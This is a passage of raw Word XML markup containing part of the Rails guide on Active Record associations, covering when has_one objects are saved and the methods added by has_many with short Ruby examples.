            </w:r>
          </w:p>
          <w:p w14:paraId="0A2AF16A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @msg</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= "No account found for this supplier"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C7C1A85" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="420F5317" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.2.4 When are Objects Saved?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F3639C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you assign an object to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, that object is automatically saved (in order to update its foreign key). In addition, any object being replaced is also automatically saved, because its foreign key will change too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744131BC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If either of these saves fails due to validation errors, then the assignment statement returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the assignment itself is cancelled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041DDFE1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the parent object (the one declaring the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association) is unsaved (that is, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new_record?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>) then the child objects are not saved. They will automatically when the parent object is saved.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0922617B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to assign an object to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association without saving the object, use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07025BA4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association Reference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00825FA6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association creates a one-to-many relationship with another model. In database terms, this association says that the other class will have a foreign key that refers to instances of this class.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249C1835" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1 Methods Added by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135965E0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you declare a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, the declaring class automatically gains 13 methods related to the association:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A5FF54" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66411D81" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;&lt;(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B15DA3E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.delete(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40626A72" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9A5CE0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE9BF77" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ids=ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5862F3A6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.clear</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672A02B7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.empty?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B71766" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780973A0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.find(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA5BD95" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.where(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A66CBBA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.exists?(…)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A28D2A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.build(attributes = {}, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0E61FD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.create(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D23007" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In all of these methods, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is replaced with the symbol passed as the first argument to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection_singular</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is replaced with the singularized version of that symbol.. For example, given the declaration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4E660F94" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="278965F8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D19A472" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BC6A2F3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C708FA9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Each instance of the customer model will have these methods:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1004EF4F" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="454419A4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders(force_reload = false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60987AD9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders&lt;&lt;(object, ...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54ADC19B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.delete(object, ...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28E92AEE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders=objects</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1420BB37" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>order_ids</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46BADCC9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>order_ids=ids</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09B4E084" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.clear</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B15E517" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.empty?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1202ABF4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.size</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B8B6837" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.find(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E29BEC6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.where(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2288A5FF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.exists?(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F54E90C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.build(attributes = {}, ...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="277D6127" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders.create(attributes = {})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="285D70E2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C05702" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns an array of all of the associated objects. If there are no associated objects, it returns an empty array.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3264"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="5C489ACE" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24D6B774" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="847256760"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@orders</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @customer.orders</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6867BD7B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;&lt;(object, …)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDD000E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method adds one or more objects to the collection by setting their foreign keys to the primary key of the calling model.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3456"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="61F45BDF" w14:textId="77777777" w:rsidTr="006E4EA1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F581A43" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="675115229"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@customer.orders &lt;&lt; @order1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
